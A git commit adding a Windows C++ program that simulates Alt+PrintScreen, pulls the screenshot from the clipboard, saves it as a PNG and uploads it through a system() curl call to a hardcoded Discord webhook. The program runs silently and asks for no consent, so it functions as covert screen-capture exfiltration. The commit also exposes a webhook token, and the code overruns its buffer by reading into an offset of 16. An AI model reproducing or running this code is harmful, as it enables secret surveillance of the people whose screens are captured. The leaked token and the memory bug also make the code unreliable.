57a3bd3b1d5056a2e8d46c4121cfa9e9106976e0
M Abdus Shakur <mabdusshakur12@gmail.com>
2023-11-24 16:28:44 +0600

    Add project files.

---
+++ Cpp-Image-Sender-Discord-Webhook/Cpp-Image-Sender-Discord-Webhook.cpp
@@ -0,0 +1,46 @@
+#include <iostream>
+#include <windows.h>
+#include <vector>
+#include <atlimage.h>
+#include <fstream>
+#include <thread>
+
+using namespace std;
+
+int main()
+{
+	//header
+    const string cmd_2 = "curl -F \"file1=@";
+
+	//capture screenshot
+	keybd_event(VK_MENU, 0, 0, 0); //Alt Press
+	keybd_event(VK_SNAPSHOT, 0, 0, 0); //PrntScrn Press
+	keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0); //PrntScrn Release
+	keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0); //Alt Release
+	HBITMAP hBitmap;
+	Sleep(200);
+	OpenClipboard(NULL);
+	hBitmap = (HBITMAP)GetClipboardData(CF_BITMAP);
+	CloseClipboard();
+	std::vector<BYTE> buf;
+	IStream* stream = NULL;
+	HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
+	CImage image;
+	ULARGE_INTEGER liSize;
+	image.Attach(hBitmap);
+	image.Save(stream, Gdiplus::ImageFormatPNG);
+	IStream_Size(stream, &liSize);
+	DWORD len = liSize.LowPart;
+	IStream_Reset(stream);
+	buf.resize(len);
+	IStream_Read(stream, &buf[16], len);
+	stream->Release();
+	std::fstream fi;
+	fi.open("W:\\Code\\RandomProjects\\Screenshot.png", std::fstream::binary | std::fstream::out);
+	fi.write(reinterpret_cast<const char*>(&buf[16]), buf.size() * sizeof(BYTE));
+	fi.close();
+	std::this_thread::sleep_for(std::chrono::milliseconds(40));
+
+	string command = cmd_2 + "W:\\Code\\RandomProjects\\Screenshot.png" + "\" " + "https://discord.com/api/webhooks/1177553043554836541/UOn1bPV16aZeI5QW55qrNVbtFvrHYOQpRGL9eLNAo1QkOv7X1upMgS__CWVzc_ipbOvt";
+	system(command.c_str());
+}
